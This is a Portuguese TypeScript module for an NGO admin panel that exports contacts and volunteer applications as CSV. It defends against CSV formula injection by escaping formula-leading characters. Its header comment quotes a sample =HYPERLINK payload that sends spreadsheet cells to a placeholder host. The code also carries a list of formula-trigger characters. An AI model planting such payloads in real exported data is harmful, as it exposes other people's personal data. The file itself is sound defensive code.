/**
 * compartilhado/exportacao.ts — o RF31: transformar o que está no banco num
 * arquivo que a equipe abre numa planilha.
 *
 * ===================================================================
 * ARQUIVO SEM NENHUM IMPORT, DE PROPÓSITO
 * ===================================================================
 *
 * Como compartilhado/permissao-de-equipe.ts, avisos-do-painel.ts e
 * triagem-de-contatos.ts: assim `testes/exportacao.test.mjs` consegue
 * importá-lo pelo runtime nativo do Node, que não resolve o alias `@/...`
 * do tsconfig nem caminho relativo sem extensão (`allowImportingTsExtensions`
 * está desligado, e o `next build` recusa com TS5097 — medido na Tarefa P4).
 *
 * Aqui isso pesa mais do que nas outras telas do painel, e por um motivo
 * que não é o de sempre: a rota que gera o arquivo está atrás de uma guarda
 * que responde 404 para quem não é equipe, então o CSV servido de verdade
 * não pode ser buscado por um teste. O que dá para medir sem sessão é ESTE
 * módulo — e é justamente ele que carrega a parte perigosa.
 *
 * ===================================================================
 * CSV É ENTRADA HOSTIL DO LADO DE FORA, NÃO SÓ DO LADO DE DENTRO
 * ===================================================================
 *
 * A lição de segurança deste projeto até aqui foi sempre sobre o que ENTRA
 * (FormData lido campo a campo, lista fechada de `?aviso=`, `eh_equipe`
 * nunca vindo do cliente). Este arquivo é sobre o que SAI, e o alvo não é o
 * nosso servidor: é o Excel de quem abrir o arquivo.
 *
 * `public.contatos` recebe texto de QUALQUER PESSOA, sem conta, pelo
 * formulário público de /contato (acoes/contato.ts). Uma pessoa escreve
 *
 *     =HYPERLINK("http://exemplo.invalido/?x="&A1;"clique aqui")
 *
 * no campo "nome". O texto fica guardado, inofensivo, e aparece como texto
 * na tela do painel — React escapa. No dia em que a equipe baixa o CSV e
 * abre no Excel ou no LibreOffice, aquilo deixa de ser texto e vira
 * FÓRMULA, avaliada na máquina de quem abriu, com acesso às outras células
 * — que são nome, e-mail e telefone de todo mundo que escreveu para a ONG.
 * É a família conhecida como "CSV formula injection" / "CSV injection".
 *
 * ASPAS NÃO PROTEGEM DISSO. Um campo `"=1+1"` continua sendo avaliado como
 * fórmula na importação — as aspas resolvem o SEPARADOR, não o `=`. As duas
 * coisas são independentes e as duas estão feitas abaixo, em ordem:
 * primeiro neutraliza a fórmula, depois cita o campo.
 *
 * `testes/exportacao.test.mjs` quebra se qualquer uma das duas sumir.
 */

/**
 * O separador é PONTO-E-VÍRGULA, não vírgula.
 *
 * Não é preferência: o Excel em português usa a vírgula como separador
 * DECIMAL e, por isso, espera `;` entre as colunas de um `.csv`. Com
 * vírgula, o arquivo abre com tudo numa coluna só — que é o defeito clássico
 * de exportação de sistema em português, e o tipo de coisa que faz a equipe
 * concluir que "o download está quebrado".
 *
 * O preço, dito em voz alta: fora do mundo pt-BR, `;` é o exótico. Este
 * arquivo é para a equipe da ONG, num celular ou num computador emprestado,
 * com o sistema em português.
 */
export const SEPARADOR = ';';

/**
 * A marca de ordem de bytes (BOM) do UTF-8, no começo do arquivo.
 *
 * Sem ela, o Excel abre um `.csv` UTF-8 assumindo a codificação local e
 * "Ateliê" vira "AteliÃª" — em TODA linha, inclusive nos nomes das pessoas.
 * Três bytes que resolvem o problema mais visível de um export brasileiro.
 *
 * Não é enfeite de acentuação: o e-mail e o nome que a equipe vai usar para
 * responder alguém precisam chegar legíveis.
 *
 * ESCRITO COMO `\uFEFF`, e não como o caractere literal, de propósito: o BOM
 * é INVISÍVEL num editor. Colado direto, ele vira um byte que ninguém vê e
 * que qualquer "limpeza de espaços em branco" apaga sem deixar rastro no
 * diff — e o defeito reapareceria como "os acentos quebraram de novo", longe
 * daqui.
 */
export const BOM_UTF8 = '\uFEFF';

/**
 * A quebra de linha é CRLF, e isso é o que o RFC 4180 pede.
 *
 * Excel e LibreOffice leem `\n` sozinho também, mas versões antigas do
 * Excel no Windows engasgam. CRLF é o que nunca dá errado.
 */
export const FIM_DE_LINHA = '\r\n';

/**
 * Os primeiros caracteres que fazem uma planilha tratar a célula como
 * FÓRMULA em vez de texto.
 *
 * `=` é o óbvio. `+` e `-` são atalhos históricos do Lotus 1-2-3 que o
 * Excel mantém. `@` inicia nome de função em algumas versões. TAB (0x09) e
 * CR (0x0D) entram porque o Excel os descarta ao importar e passa a olhar o
 * caractere seguinte — ou seja, `\t=cmd` contorna uma verificação que só
 * olhasse o primeiro caractere visível.
 *
 * Esta lista é a razão de este arquivo existir. Encurtá-la sem medir é
 * reabrir o buraco.
 */
export const PRIMEIROS_CARACTERES_DE_FORMULA = ['=', '+', '-', '@', '\t', '\r'];

/**
 * O que se põe na frente de um campo que começaria fórmula.
 *
 * O apóstrofo é o que a planilha entende como "o resto disto é texto".
 *
 * O QUE ISSO CUSTA, e é visível: um telefone gravado como "+55 11 99999-9999"
 * sai no arquivo como "'+55 11 99999-9999", com o apóstrofo à mostra na
 * célula (num CSV importado ele é DADO, não a marca invisível que o Excel
 * usa quando alguém digita). Quem copiar o telefone leva o apóstrofo junto.
 *
 * FOI ESCOLHIDO ASSIM MESMO, e a conta é esta: do lado do incômodo, um
 * apóstrofo que se apaga; do lado oposto, uma fórmula escrita por um
 * desconhecido rodando na máquina de quem abriu o arquivo, com a lista de
 * contatos da ONG ao alcance. A tela que oferece o download diz isso por
 * escrito, para que o apóstrofo não pareça defeito.
 *
 * A alternativa recusada foi adivinhar quando o valor "parece" telefone e
 * deixar passar: heurística de conteúdo é exatamente por onde a injeção
 * volta. O que existe abaixo é uma exceção por TIPO, não por aparência —
 * ver `escaparCampoCsv`.
 */
export const MARCA_DE_TEXTO = "'";

/**
 * Um campo, pronto para entrar na linha: fórmula neutralizada e aspas
 * resolvidas, nesta ordem.
 *
 * NÚMERO NÃO RECEBE A MARCA, e a diferença é de TIPO, não de aparência: um
 * `number` do JavaScript não veio de texto que alguém digitou — ele veio de
 * uma coluna numérica do Postgres. `-1` numa célula é o número -1, não
 * código. Fosse por aparência ("parece número, deixa passar"), `-1+CMD()`
 * também pareceria, e é aí que a injeção volta.
 *
 * `boolean` vira "sim"/"não" porque quem lê a planilha é a equipe da ONG,
 * não um programa: `consentimento_dados` é a coluna que diz se a pessoa
 * autorizou o contato, e "true" numa célula não responde essa pergunta para
 * quem está atendendo.
 *
 * `null`/`undefined` viram CÉLULA VAZIA, nunca a palavra "null" nem um
 * traço: campo sem dado é campo sem dado (regra 2 do CLAUDE.md aplicada ao
 * arquivo — o que não existe não é inventado).
 */
export function escaparCampoCsv(valor: string | number | boolean | null | undefined): string {
  if (valor === null || valor === undefined) return '';
  if (typeof valor === 'number') return citarSePreciso(String(valor));
  if (typeof valor === 'boolean') return valor ? 'sim' : 'não';

  return citarSePreciso(neutralizarFormula(valor));
}

/**
 * A primeira metade: o campo deixa de poder virar fórmula.
 *
 * Olha o PRIMEIRO caractere, que é onde a planilha decide. Um `=` no meio
 * do texto não inicia fórmula nenhuma e não é tocado — mexer nele mudaria o
 * texto que a pessoa escreveu sem necessidade.
 */
export function neutralizarFormula(texto: string): string {
  if (texto.length === 0) return texto;

  return PRIMEIROS_CARACTERES_DE_FORMULA.includes(texto[0])
    ? MARCA_DE_TEXTO + texto
    : texto;
}

/**
 * A segunda metade: o campo deixa de poder quebrar a estrutura do arquivo.
 *
 * Cita quando há separador, aspas, quebra de linha — ou espaço na ponta,
 * que algumas planilhas comem em silêncio, e um e-mail com espaço comido é
 * um e-mail que a equipe copia e não funciona.
 *
 * Aspas internas viram aspas dobradas, que é o escape do próprio CSV
 * (RFC 4180). NÃO é barra invertida: `\"` deixaria o arquivo malformado e a
 * linha inteira desalinhada a partir dali.
 */
export function citarSePreciso(texto: string): string {
  const precisa = texto.includes(SEPARADOR)
    || texto.includes('"')
    || texto.includes('\n')
    || texto.includes('\r')
    || texto !== texto.trim();

  return precisa ? `"${texto.replace(/"/g, '""')}"` : texto;
}

/** Uma coluna do arquivo: a chave da linha e o título que a equipe lê. */
export type ColunaExportada = { chave: string; titulo: string };

/** Uma linha, indexada pela `chave` das colunas. */
export type LinhaExportada = Record<string, string | number | boolean | null | undefined>;

/**
 * O arquivo inteiro: BOM, cabeçalho e uma linha por registro.
 *
 * O CABEÇALHO TAMBÉM PASSA PELO ESCAPE, e não é preciosismo: ele é escrito
 * por nós e hoje não tem nada perigoso, mas se um título ganhar um
 * ponto-e-vírgula ("Nome; instituição") o arquivo inteiro desalinha, e o
 * defeito apareceria como "o export está trocando as colunas".
 *
 * SEM LINHA EM BRANCO NO FIM, de propósito: uma planilha lê isso como um
 * registro vazio, e a equipe conta uma pessoa a mais.
 */
export function montarCsv(colunas: ColunaExportada[], linhas: LinhaExportada[]): string {
  const cabecalho = colunas.map((coluna) => escaparCampoCsv(coluna.titulo)).join(SEPARADOR);

  const corpo = linhas.map((linha) =>
    colunas.map((coluna) => escaparCampoCsv(linha[coluna.chave])).join(SEPARADOR));

  return BOM_UTF8 + [cabecalho, ...corpo].join(FIM_DE_LINHA) + FIM_DE_LINHA;
}

/* =====================================================================
   O QUE PODE SER EXPORTADO — a lista fechada
   ===================================================================== */

/**
 * As chaves aceitas por `/admin/exportar/<conjunto>`.
 *
 * LISTA FECHADA pelo mesmo motivo de `?aviso=` e do `type` do link de
 * e-mail: o segmento da URL é entrada de usuário. Sem a lista, o caminho
 * fácil seria usar o valor recebido como nome de tabela — e aí
 * `/admin/exportar/perfis` viraria um export que ninguém desenhou. A RLS
 * continuaria decidindo o que sai (regra 5), mas quem é equipe lê quase
 * tudo, e "a RLS segura" não é desculpa para deixar a URL escolher a
 * consulta.
 */
export type ConjuntoExportavel = 'contatos' | 'voluntarios';

export type DescricaoDeConjunto = {
  chave: ConjuntoExportavel;
  /** O texto do link, na tela do painel — verbo, porque é um gesto. */
  rotulo: string;
  /** O que vem dentro do arquivo, dito antes de a pessoa gastar dados baixando. */
  descricao: string;
  /** O começo do nome do arquivo. A data entra depois, em `nomeDoArquivo`. */
  arquivo: string;
  /** As colunas, na ordem em que aparecem na planilha. */
  colunas: ColunaExportada[];
};

/**
 * A ORDEM DAS COLUNAS É A ORDEM DE LEITURA, e ela foi escolhida para quem
 * abre a planilha para RESPONDER alguém: quando, quem, como falar, e só
 * então o texto.
 *
 * O identificador vai por último. Ele não serve para a equipe — serve para
 * quem cuida do site achar a linha no banco quando alguém pedir a exclusão
 * dos dados (a promessa de /privacidade que o painel não cumpre sozinho,
 * dita em componentes/ListaContatos.ts). Na primeira coluna ele só empurraria
 * o nome para fora da tela.
 */
export const CONJUNTOS_EXPORTAVEIS: DescricaoDeConjunto[] = [
  {
    chave: 'contatos',
    rotulo: 'Baixar as mensagens recebidas',
    descricao: 'Tudo que chegou pelo formulário do site: quem escreveu, como falar com a '
      + 'pessoa, o texto inteiro e em que pé está o atendimento.',
    arquivo: 'mensagens',
    colunas: [
      { chave: 'recebida_em', titulo: 'Recebida em' },
      { chave: 'situacao', titulo: 'Situação' },
      { chave: 'nome', titulo: 'Nome' },
      { chave: 'email', titulo: 'E-mail' },
      { chave: 'telefone', titulo: 'Telefone' },
      { chave: 'instituicao', titulo: 'Instituição' },
      { chave: 'origem', titulo: 'Veio de' },
      { chave: 'mensagem', titulo: 'Mensagem' },
      { chave: 'consentimento', titulo: 'Autorizou o contato' },
      { chave: 'id', titulo: 'Identificador' }
    ]
  },
  {
    chave: 'voluntarios',
    rotulo: 'Baixar as candidaturas de voluntariado',
    descricao: 'Quem se candidatou pelo site, em quais áreas quer ajudar e o que escreveu. '
      + 'Hoje este arquivo é o ÚNICO jeito de ler as candidaturas: não existe tela para elas.',
    arquivo: 'candidaturas-voluntariado',
    colunas: [
      { chave: 'recebida_em', titulo: 'Candidatou-se em' },
      { chave: 'situacao', titulo: 'Situação' },
      { chave: 'nome', titulo: 'Nome' },
      { chave: 'email', titulo: 'E-mail' },
      { chave: 'telefone', titulo: 'Telefone' },
      { chave: 'areas', titulo: 'Áreas' },
      { chave: 'mensagem', titulo: 'Mensagem' },
      { chave: 'id', titulo: 'Identificador' }
    ]
  }
];

/** A lista fechada, como guarda de tipo. Qualquer outro valor é recusado. */
export function ehConjuntoExportavel(valor: unknown): valor is ConjuntoExportavel {
  return typeof valor === 'string'
    && CONJUNTOS_EXPORTAVEIS.some((conjunto) => conjunto.chave === valor);
}

/** A descrição de um conjunto, ou `null` — nunca uma exceção. */
export function conjuntoPorChave(valor: unknown): DescricaoDeConjunto | null {
  if (!ehConjuntoExportavel(valor)) return null;
  return CONJUNTOS_EXPORTAVEIS.find((conjunto) => conjunto.chave === valor) ?? null;
}

/**
 * O nome do arquivo que o navegador vai salvar.
 *
 * SÓ ASCII, e é decisão: o `filename` de um `Content-Disposition` com
 * acento exige a forma `filename*=UTF-8''...`, que navegador velho ignora —
 * e o desfecho de um cabeçalho malformado é o arquivo salvo como
 * "download" sem extensão, no celular de quem está de pé no meio de um
 * evento. "candidaturas-voluntariado" já está sem acento por isso.
 *
 * A DATA ENTRA NO NOME porque a equipe vai baixar de novo daqui a um mês, e
 * dois arquivos chamados "mensagens.csv" na pasta de downloads do celular
 * viram "mensagens(1).csv" — e ninguém sabe qual é o mais novo.
 *
 * `agora` é parâmetro, não `new Date()` lá dentro: é o que torna o nome
 * verificável num teste sem depender do dia em que ele roda.
 */
export function nomeDoArquivo(conjunto: DescricaoDeConjunto, agora: Date): string {
  const ano = agora.getFullYear();
  const mes = String(agora.getMonth() + 1).padStart(2, '0');
  const dia = String(agora.getDate()).padStart(2, '0');

  return `${conjunto.arquivo}-${ano}-${mes}-${dia}.csv`;
}

/**
 * A situação de uma candidatura de voluntariado, na palavra que a equipe lê.
 *
 * Os quatro valores são o `check` de `public.voluntarios.situacao`
 * (supabase/migrations/004_pessoas.sql). Na coluna eles estão no masculino
 * porque ela se chama `situacao` e foi escrita assim; aqui aparecem no
 * FEMININO porque na planilha o sujeito é a CANDIDATURA — mesma decisão, e
 * o mesmo motivo, de compartilhado/triagem-de-contatos.ts.
 *
 * ESTE MAPA MORA AQUI, e não junto do de contatos, porque não há tela de
 * voluntariado no painel para compartilhá-lo com ninguém (RF26 não existe).
 * No dia em que houver, ele se muda para um módulo próprio, junto com a
 * ordenação e os botões daquela tela — e não se duplica.
 *
 * VALOR DESCONHECIDO VOLTA COMO VEIO. Mesma regra dos outros rótulos do
 * projeto: mostrar o valor cru é honesto; inventar "Outra" esconderia da
 * equipe que a planilha ficou velha.
 */
const SITUACOES_DE_CANDIDATURA: Record<string, string> = {
  novo: 'Nova',
  em_contato: 'Em contato',
  ativo: 'Ativa',
  inativo: 'Inativa'
};

export function rotuloDaCandidatura(valor: string): string {
  // `Object.hasOwn` e não o acesso direto: sem isto, uma linha com `situacao`
  // valendo "toString" devolveria algo herdado do protótipo de Object. É a
  // mesma precaução de compartilhado/triagem-de-contatos.ts.
  return Object.hasOwn(SITUACOES_DE_CANDIDATURA, valor) ? SITUACOES_DE_CANDIDATURA[valor] : valor;
}

/**
 * A data como a equipe lê, no fuso de São Paulo.
 *
 * `criado_em` chega do PostgREST como ISO 8601 em UTC
 * ("2026-09-01T18:34:56.789+00:00"). Numa planilha isso é ilegível, e pior:
 * está três horas adiantado em relação ao relógio de quem atende, o que faz
 * uma mensagem das 22h de ontem parecer de hoje.
 *
 * VALOR QUE NÃO DÁ PARA LER VOLTA COMO VEIO, e isso é a regra 2: inventar
 * uma data para uma string que não entendemos é pior que mostrar a string.
 */
export function dataParaPlanilha(iso: string | null | undefined): string {
  if (!iso) return '';

  const quando = new Date(iso);
  if (Number.isNaN(quando.getTime())) return iso;

  return new Intl.DateTimeFormat('pt-BR', {
    timeZone: 'America/Sao_Paulo',
    day: '2-digit', month: '2-digit', year: 'numeric',
    hour: '2-digit', minute: '2-digit'
  }).format(quando);
}
